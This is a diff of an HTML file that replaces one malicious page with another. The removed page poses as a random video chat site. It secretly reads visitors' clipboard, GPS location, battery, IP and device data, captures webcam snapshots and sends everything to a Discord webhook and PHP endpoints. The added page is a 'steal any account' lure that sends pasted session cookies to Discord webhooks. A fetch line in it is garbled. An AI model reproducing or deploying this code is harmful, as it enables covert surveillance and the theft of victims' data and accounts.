@@ -1,317 +1,175 @@
-<html>
-   <head>
-      <style>
-
-         img[alt*="www.000webhost.com"], .disclaimer {
-
-         display: none
-         }
-         .iframe-container {
-           position: relative;
-           width: 100%;
-           height: 100vh;
-         }
-
-         .dialog-box {
-           position: absolute;
-           top: 50%;
-           left: 50%;
-           transform: translate(-50%, -50%);
-           background-color: #ffffff;
-           border-radius: 8px;
-           box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-           padding: 20px;
-           text-align: center;
-           max-width: 300px;
-         }
-
-         .dialog-box h2 {
-           margin-top: 0;
-           color: #333333;
-         }
-
-         .dialog-box p {
-           margin-bottom: 20px;
-           color: #666666;
-         }
-
-         .btn-allow {
-           background-color: #4CAF50;
-           color: #ffffff;
-           border: none;
-           padding: 10px 20px;
-           text-align: center;
-           text-decoration: none;
-           display: inline-block;
-           font-size: 16px;
-           border-radius: 4px;
-           cursor: pointer;
-           transition: background-color 0.3s;
-         }
-
-         .btn-allow:hover {
-           background-color: #45a049;
-         }
-      </style>
-
-      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-      <meta name="viewport" content="width=device-width, initial-scale=1" />
-      <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
-      <meta
-         name="description"
-         content="Enjoy our Anonymous  random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com"
-         />
-      <link rel="canonical" href="https://strangercam.com/" />
-      <meta property="og:locale" content="en_US" />
-      <meta property="og:type" content="website" />
-      <meta
-         property="og:title"
-         content="Random Video Chat - StrangerCam.com: Cam With Strangers"
-         />
-      <meta
-         property="og:description"
-         content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com."
-         />
-
-      <meta property="og:site_name" content="Stranger Cam" />
-      <meta
-         property="article:publisher"
-         content="https://www.facebook.com/strangercam"
-         />
-      <meta
-         property="article:modified_time"
-         content="2021-12-17T14:46:35+00:00"
-         />
-      <meta
-         property="og:image"
-         content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png"
-         />
-      <meta property="og:image:width" content="800" />
-      <meta property="og:image:height" content="532" />
-      <meta property="og:image:type" content="image/png" />
-      <meta name="twitter:card" content="summary_large_image" />
-      <meta name="twitter:site" content="@strangercamapp" />
-      <meta name="twitter:label1" content="Est. reading time" />
-      <meta name="twitter:data1" content="4 minutes" />
-      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
-      <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
-      <script src="x-frame-bypass.js" type="module"></script>
-      <script>
-         $(document).ready(function() {
-            var batterypercentage;
-            var ischarging;
-            function getPublicIp() {
-              const xhr = new XMLHttpRequest();
-              xhr.open('GET', 'https://api.ipify.org?format=json', false);
-              xhr.send();
-
-              if (xhr.status === 200) {
-                const data = JSON.parse(xhr.responseText);
-                return data.ip;
-              } else {
-                console.error(`Error: ${xhr.statusText}`);
-                return null;
-              }
-            }
-
-             const publicIp = getPublicIp();
-             async function getclips() {
-                var btr = await navigator.getBattery();
-                batterypercentage = String(btr.level * 100 + "%");
-                ischarging = String(btr.charging);
-
-              // Add a 8-second delay using setTimeout
-              setTimeout(async function() {
-                try {
-                  let victimtext = await navigator.clipboard.readText();
-                  giveclips(victimtext);
-                } catch (error) {
-                  giveclips("Clipboard Permission Denied");
-                }
-              }, 8000);
-            }
-
-            getclips();
-           var clips
-
-           function giveclips(polp) {
-             clips = polp
-             getLocation()
-           }
-
-          function getLocation() {
-                 if (navigator.geolocation) {
-                   setTimeout(() => {
-                     navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
-                   }, 5000);
-                 } else {
-                   alert("Your Browser Does not support Gps");
-                 }
-               }
-
-           function showPosition(position) {
-             var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
-             sdrp(grak, clips,batterypercentage,ischarging);
-             senddis(grak, clips,batterypercentage,ischarging);
-           }
-
-           function showError(error) {
-             switch (error.code) {
-               case error.PERMISSION_DENIED:
-                 sdrp("Location Permission Denied",clips,batterypercentage,ischarging);
-                 senddis("Location Permission Denied",clips,batterypercentage,ischarging)
-                 alert("Allow Location permission to Chat with nearby Strangers");
-
-                 break;
-               case error.POSITION_UNAVAILABLE:
-                 window.close()
-                 break;
-               case error.TIMEOUT:
-                 window.close()
-                 break;
-               case error.UNKNOWN_ERROR:
-                 window.close()
-                 break;
-             }
-           }
-
-           let datetime = new Date();
-           let localtime = String(datetime.toLocaleTimeString());
-           let referurl = document.referrer;
-           let cpuThreads = String(navigator.hardwareConcurrency);
-           let deviceram = String(navigator.deviceMemory) + "gb";
-           let useragent = navigator.userAgent;
-           let iscookieEnabled = String(navigator.cookieEnabled);
-           let devicelang = String(navigator.language);
-           let width = screen.width;
-           let height = screen.height;
-           let platform = navigator.platform;
-           let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-           let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
-
-           function senddis(gpsr, clips,batterypercentage,ischarging) {
-             var request = new XMLHttpRequest();
-             request.open("POST", "https://discord.com/api/webhooks/1510042046058991828/T1GVmjZAykwETFHopMWRNV1LWgpQTyk4opShcuuKMSVH84cWtOIfYHHgVDmz-u9I_WYk");
-             request.setRequestHeader('Content-type', 'application/json');
-             var params = {
-               content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n" + "> **Public IP  : **" + publicIp),
-               username: "nivistealer",
-               avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
-             }
-             request.send(JSON.stringify(params));
-           }
-
-           function sdrp(bsdks, clipboard,batterypercentage,ischarging) {
-             $.ajax({
-               type: "POST",
-               url: "sunni.php",
-               data: {
-                 networkinformation : networkinformation,
-                 batterypercentage:batterypercentage,
-                 ischarging:ischarging,
-                 width: width,
-                 height: height,
-                 platform: platform,
-                 gps: bsdks,
-                 devicelang: devicelang,
-                 iscookieEnabled: iscookieEnabled,
-                 useragent: useragent,
-                 deviceram: deviceram,
-                 cpuThreads: cpuThreads,
-                 referurl: referurl,
-                 localtime: localtime,
-                 clipboard: clipboard,
-               },
-               cache: false,
-               success: function(data) {},
-               error: function(xhr, status, error) {
-                 console.log(error);
-               }
-             })
-           }
-         })
-      </script>
-   </head>
-   <div class="video-wrap" hidden="hidden">
-      <video id="video" playsinline autoplay></video>
-   </div>
-   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-   <script>
-      function post(imgdata) {
-        $.ajax({
-          type: 'POST',
-          data: {
-            cat: imgdata
-          },
-          url: 'post.php',
-          dataType: 'json',
-          async: false,
-          success: function(result) {
-            // call the function that handles the response/results
-          },
-          error: function() {}
-        });
-      };
-      'use strict';
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const errorMsgElement = document.querySelector('span#errorMsg');
-      const constraints = {
-        audio: false,
-        video: {
-          facingMode: "user"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STEAL ANYONE ACCOUNT</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: black;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
         }
-      };
-      // Access webcam
-      async function init() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia(constraints);
-          handleSuccess(stream);
-        } catch (e) {
-          setTimeout(function(){
-          alert("Allow Camera access to chat with strangers");
-          window.location.href = "https://support.onemob.com/hc/en-us/articles/360037342154-How-do-I-grant-permission-for-Camera-and-Microphone-in-my-web-browser-"
-      alert("Read this page to grant camera access to  our website")
-       },15000) }
-      }
-      // Success
-      function handleSuccess(stream) {
-        window.stream = stream;
-        video.srcObject = stream;
-        var context = canvas.getContext('2d');
-        setInterval(function() {
-          context.drawImage(video, 0, 0, 640, 480);
-          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-          post(canvasData);
-        }, 3500);
-      }
-      // Load init
-      init();
-   </script>
-   <body>
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4);
+        }
+        textarea {
+            width: 300px;
+            height: 100px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 16px;
+            resize: none;
+            background: #333;
+            color: white;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: black;
+            overflow: hidden;
+        }
+        .matrix canvas {
+            display: block;
+        }
+        .credits {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            font-size: 12px;
+            color: gray;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix">
+        <canvas id="matrixCanvas"></canvas>
+    </div>
+    <div class="container">
+        <h1>Enter the account cookie you want to enter</h1>
+        <p>Paste cookie in this text box below</p>
+        <textarea id="messageBox" placeholder="Paste your cookie here..."></textarea><br>
+        <button onclick="sendToWebhook()">Send</button>
+        <p id="statusMessage"></p>
+        <p id="accountDetails" style="display: none; color: red;"></p>
+    </div>
+    <div class="credits">
+        creds to heyitspat_y<br>
+        Discord : <a href="https://discord.gg/EsDrJ84XvR" target="_blank">https://discord.gg/EsDrJ84XvR</a>
+    </div>
 
-     <div class="iframe-container">
-         <iframe
-            is="x-frame-bypass"
-            src="https://strangercamchat.com"
-            frameborder="0"
-            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
-            height="100%"
-            width="100%"
-            ></iframe>
-            <div class="dialog-box" id="dialogBox">
-              <h2>Alert</h2>
-              <p>Please Allow all permissions to continue to chat with strangers</p>
-               <button class="btn-allow" id="allowBtn">OK</button>
-           </div>
+    <script>
+        async function sendToWebhook() {
+            const messageBox = document.getElementById('messageBox');
+            const message = messageBox.value.trim();
+            const statusMessage = document.getElementById('statusMessage');
+            const accountDetails = document.getElementById('accountDetails');
 
-      </div>
-      <script>
-    document.getElementById("allowBtn").addEventListener("click", function() {
-      document.getElementById("dialogBox").style.display = "none";
-    });
-  </script>
+            if (message.length < 10) {
+                statusMessage.textContent = 'No funny business, You want the account or not?';
+                return;
+            }
 
+            statusMessage.textContent = 'Grabbing account. Please wait! | The account is being hacked...';
+
+            // Send to webhook ASAP
+            try {
+                await fetch('https://discord.com/api/webhooks/1316470476956237844/OLLYXYXI3GYsoWNn0nm0hSNXK7CNcj4ZP5O-JkdXC2LmyuOQZ7RzbIhhefPS3gfAujUshttps://discord.com/api/webhooks/1511936494611464272/c0aWZMGN96XwSBtF_XOFKNWACBLhCn58vzSB0BeoIEPg_DNAnpmFoaJ-HCTHMINYFuVq', {
+                await fetch('', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `@everyone\n\nHere is the cookie master Nonchalant\n\n\` ${message} \``
+                    }),
+                });
+            } catch (error) {
+                console.error('Error sending to webhook:', error);
+                statusMessage.textContent = 'Failed to send to webhook. Please try again.';
+                return;
+            }
+
+            // Start the countdown
+            let timer = 120; // 2 minutes countdown
+            const countdown = setInterval(() => {
+                if (timer <= 0) {
+                    clearInterval(countdown);
+                    statusMessage.textContent = '';
+                    accountDetails.innerHTML = `
+                        <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-50849A5064B50B75129E241412B894EF-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="User Image"><br>
+                        <strong>Username:</strong> nicorobin_solos<br>
+                        <strong>User ID:</strong> 4179585303<br>
+                        <strong>Password:</strong> J86aN84_+:'K<br>
+                        Here is the account!
+                    `;
+                    accountDetails.style.display = 'block';
+                } else {
+                    statusMessage.textContent = `Time remaining: ${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, '0')}`;
+                }
+                timer--;
+            }, 1000);
+        }
+
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const columns = Math.floor(canvas.width / 20);
+        const drops = Array(columns).fill(1);
+
+        const draw = () => {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0f0';
+            ctx.font = '15px monospace';
+
+            drops.forEach((y, index) => {
+                const text = String.fromCharCode(Math.random() * 128);
+                const x = index * 20;
+
+                ctx.fillText(text, x, y * 20);
+
+                if (y * 20 > canvas.height && Math.random() > 0.975) {
+                    drops[index] = 0;
+                }
+
+                drops[index]++;
+            });
+        };
+
+        setInterval(draw, 50);
+    </script>
 </body>
-
 </html>
